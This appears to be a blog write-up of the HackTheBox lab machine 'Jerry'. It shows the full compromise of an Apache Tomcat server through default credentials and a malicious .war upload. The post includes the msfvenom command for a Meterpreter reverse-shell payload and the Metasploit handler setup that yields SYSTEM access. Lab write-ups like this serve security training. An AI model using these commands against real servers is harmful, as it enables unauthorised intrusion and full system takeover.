Starting off with nmap to determine what ports are open, what services are running on the ports and what are their versions, thus determining the target !

![nmap]({{ site.baseurl }}/assets/htb-images/jerry/nmap.jpg)

So there is only 1 port open, which is: 

+ *8080 http Apache Tomcat*

Let's look at the web page and do some enumeration to find any vulnerabilities.

![index.html]({{ site.baseurl }}/assets/htb-images/jerry/index.html.jpg)

It looks like you this is the default apache tomcat page running version 7.0.88. There are also 3 other web pages; Server Status, Manager App, Host Manager. From experience I know that Host Manager will redirect me to Manager App once I log in successfully, so I will skip it. Let's see what we can find in Server Status page.

As I tried to access the page a login prompt popped up, as usual, but I was able to guess the default credentials **(admin:admin)**. Once I accessed the page I was able to see what is the Hostname of the machine, OS name and version and system architecture.

I now know with which OS I have to deal. Now, went back to index.html, and tried to login to Manager App. And here I found something interesting. The developer left the default credentials, and tomcat was nice enough to show the default error screen, when I tried to login with wrong username and password.

I grabbed the credentials from the error page and tried to login to the Manager App, and... Success !

As I'm now logged in as admin, Tomcat has a feature to upload .war files, which I am able to exploit by using msfvenom to generate a reverse shell with .war extension. War files are also like zip files, they store other files inside it, and by this it means that once I upload a war file to tomcat and try to access it, instead of getting the reverse shell immediately, I will have to specify the actual .jsp file inside the war file. And I can do this by simply unzipping the war file to see the actual payload file.

![revshellwar]({{ site.baseurl }}/assets/htb-images/jerry/revshellwar.jpg)

```shell
#MSFVenom command to generate .war malicious file.
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f war -o ev1l.war
```
 
I opened Metasploit and set the handler I need to use, after that i set the payload and the options to be able to get a connection back.

```shell
#In Metasploit
$ use multi/handler
$ set payload windows/x64/meterpreter/reverse_tcp
$ set LHOST <LocalIP>
$ set LPORT 4444
$ exploit
```

Once I uploaded the file I unzipped it on my box, checked the jsp file name and accessed it in the web browser to trigger the payload and get reverse shell.

![revshellopen]({{ site.baseurl }}/assets/htb-images/jerry/revshellopen.jpg)

As I now have a meterpreter reverse shell in metasploit I can check now what user I have access to. And it turns out that I was logged in as NT AUTHORITY\SYSTEM. Game Over !

That's how you do Jerry from HackTheBox !
